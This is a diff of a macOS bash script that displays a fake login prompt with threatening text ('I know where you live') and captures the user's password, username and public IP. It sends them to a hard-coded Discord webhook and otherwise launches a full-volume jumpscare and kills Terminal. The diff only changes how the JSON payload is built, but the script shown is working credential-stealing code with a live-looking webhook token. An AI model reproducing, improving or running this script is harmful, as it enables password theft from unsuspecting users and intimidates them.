@@ -1,18 +1,18 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS
+# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON)
 # ----------------------------------------------------------------
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# - If a non-empty password is entered, the script sends the data (password, public IP, username)
+# - If a non-empty password is entered, it sends the data (password, public IP, username)
 #   to a Discord webhook.
-# - If the user presses Cancel (i.e. if the dialog is cancelled), the jumpscare branch is triggered:
-#     It creates a temporary HTML file that embeds a jumpscare video from GitHub,
-#     sets system volume to maximum, opens the HTML file in the default browser in full screen,
+# - If the user presses Cancel (or closes the prompt), it triggers a jumpscare:
+#     It creates a temporary HTML file that embeds your jumpscare video from GitHub,
+#     sets system volume to maximum, opens it in the default browser in full screen,
 #     and then forcefully kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either Python 3 or Python 2 installed.
+#   - macOS with osascript, curl, and standard Unix tools.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -31,8 +31,8 @@ capture="username=${username}\n____________________________________________\n\n"
 # The prompt displays:
 #   Line 1: "I know where you live, [FirstName]."
 #   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# It repeats until the user enters a non-empty value.
-# If the user cancels, it returns "CANCEL".
+# It repeats if the user presses OK with an empty input.
+# If the user cancels (error -128), it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -129,18 +129,10 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Determine Which Python Interpreter to Use (Prefer Python 3, then Python 2) ---
-    if command -v python3 >/dev/null 2>&1; then
-        PYTHON=python3
-    elif command -v python >/dev/null 2>&1; then
-        PYTHON=python
-    else
-        echo "Error: Neither python3 nor python is installed. Exiting."
-        exit 1
-    fi
-    
-    # --- Generate JSON Payload ---
-    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
+    # --- Manually Generate JSON Payload Without Python ---
+    # Escape double quotes and newlines.
+    escaped=$(sed ':a;N;$!ba;s/\n/\\n/g; s/"/\\"/g' /tmp/pass.txt)
+    payload="{\"content\": \"$escaped\"}"
     
     # --- Send Payload to Discord Webhook ---
     DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
